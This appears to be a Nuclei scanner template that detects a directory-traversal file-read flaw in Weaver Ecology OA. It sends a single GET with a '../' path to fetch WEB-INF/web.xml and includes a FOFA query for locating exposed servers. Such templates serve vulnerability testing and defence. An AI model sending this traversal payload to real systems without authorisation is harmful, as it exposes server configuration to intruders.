id: ecology-filedownload-directory-traversal

info:
  name: Ecology - Local File Inclusion
  author: princechaddha
  severity: high
  description: Ecology is vulnerable to local file inclusion.
  classification:
    cpe: cpe:2.3:a:ecology:ecology:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-23
  metadata:
    max-request: 1
    fofa-query: app="泛微-协同办公OA"
    vendor: ecology
    product: ecology
  tags: ecology,lfi,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        name: ecology
        cpe: cpe:2.3:a:ecology:ecology:*:*:*:*:*:*:*:*
        words:
          - "<url-pattern>/weaver/"
        part: body
